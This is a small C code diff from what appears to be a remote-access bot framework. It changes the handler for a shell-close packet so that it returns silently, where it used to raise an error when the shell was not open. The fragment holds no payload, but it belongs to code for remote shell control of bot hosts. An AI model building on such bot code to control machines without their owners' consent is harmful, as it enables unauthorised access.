@@ -70,7 +70,7 @@ void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
 
     /* check if shell is not running */
     if (id > LAIKA_MAX_SHELLS || !(shell = bot->shells[id]))
-        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE requested on unopened shell!\n");
+        return;
 
     /* close shell */
     laikaB_freeShell(bot, shell);
